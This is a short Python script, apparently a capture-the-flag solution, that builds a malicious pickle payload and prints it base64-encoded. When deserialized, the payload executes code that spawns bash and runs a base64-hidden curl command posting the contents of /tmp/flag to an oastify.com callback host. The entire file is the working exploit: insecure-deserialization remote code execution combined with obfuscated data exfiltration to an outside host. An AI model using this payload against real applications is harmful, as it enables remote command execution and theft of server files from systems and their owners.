import base64
opcode='''(cbuiltins
exec
S'u=User();u.username=__import__(\'pty\').spawn([\'bash\',\'-c\',\'echo Y3VybCAtWCBQT1NUIGh0dHA6Ly9paDM1YTNjYTRnZG56emFkaWRwNTBsN2tzYnkybXNhaC5vYXN0aWZ5LmNvbSAtZCAkKGNhdCAvdG1wL2ZsYWcp|base64 -d|bash\']);1'
o.'''.encode()
print(base64.b64encode(opcode).decode())
# # print(opcode)
# import pickle
# pickle.loads(opcode)
# class User:
#     name:str="123"
# print(pickle.dumps(['a','b','c']))